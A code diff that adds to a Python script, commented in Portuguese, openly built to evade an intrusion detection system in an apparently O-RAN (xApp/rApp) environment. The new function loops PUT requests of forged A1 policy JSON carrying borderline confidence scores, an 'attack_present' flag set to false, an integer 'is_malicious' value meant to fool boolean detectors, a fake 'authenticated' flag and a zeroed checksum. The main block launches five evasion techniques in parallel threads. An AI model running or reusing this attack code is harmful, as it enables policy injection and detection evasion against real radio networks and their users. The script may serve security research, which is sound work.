@@ -200,3 +200,65 @@ def tecnica4_time_drifting():
 # ============================================================
 # TECNICA 5: HYPOGLYPH INJECTION (rApp)
 # ============================================================
+def tecnica5_hypoglyph_injection():
+    """Valores limítrofes (boundary) que confundem classificadores ML"""
+    time.sleep(15)
+    boundaries = [0.49, 0.50, 0.51, 0.48, 0.52]
+    idx = 0
+    while True:
+        try:
+            idx = (idx + 1) % len(boundaries)
+
+            ataque = {
+                "type": "A1_POLICY",
+                "scope": "UE_GROUP_1",
+                "value": True,
+                "confidence": boundaries[idx],  # Valor limítrofe!
+                "reason": "ENERGY_SAVING_ADAPTATION",
+                "attack_present": False,  # Mente
+                "is_malicious": 0,  # Inteiro 0 engana detectores booleanos
+                "severity_score": random.choice([0.49, 0.50, 0.51]),
+                "authenticated": True,
+                "checksum": "00000000"
+            }
+
+            data = json.dumps(ataque).encode()
+            req = urllib.request.Request(BASE_URL, data=data, method="PUT")
+            req.add_header('Content-Type', 'application/json')
+            with urllib.request.urlopen(req, timeout=2): 
+                pass
+            time.sleep(1.2)
+        except Exception as e:
+            print(f"[IDS-T5:Hypoglyph] Erro: {e}")
+            time.sleep(1.5)
+
+# ============================================================
+# MAIN
+# ============================================================
+if __name__ == "__main__":
+    print("\n[!] INICIANDO ATAQUE DE EVASAO DE IDS (5 tecnicas)\n")
+
+    tecnicas = [
+        ("Adversarial Noise (xApp)", tecnica1_adversarial_noise),
+        ("Gradient Masking (xApp)", tecnica2_gradient_masking),
+        ("Data Camouflage (rApp)", tecnica3_data_camouflage),
+        ("Time Drifting (xApp+rApp)", tecnica4_time_drifting),
+        ("Hypoglyph Injection (rApp)", tecnica5_hypoglyph_injection),
+    ]
+
+    threads = []
+    for nome, func in tecnicas:
+        t = threading.Thread(target=func, daemon=True)
+        t.start()
+        threads.append(t)
+        print(f"  [OK] {nome}")
+
+    print(f"\n[+] {len(threads)} threads rodando em paralelo")
+    print("[+] Pressione Ctrl+C para parar\n")
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[!] Ataque interrompido pelo operador")
+        sys.exit(0)
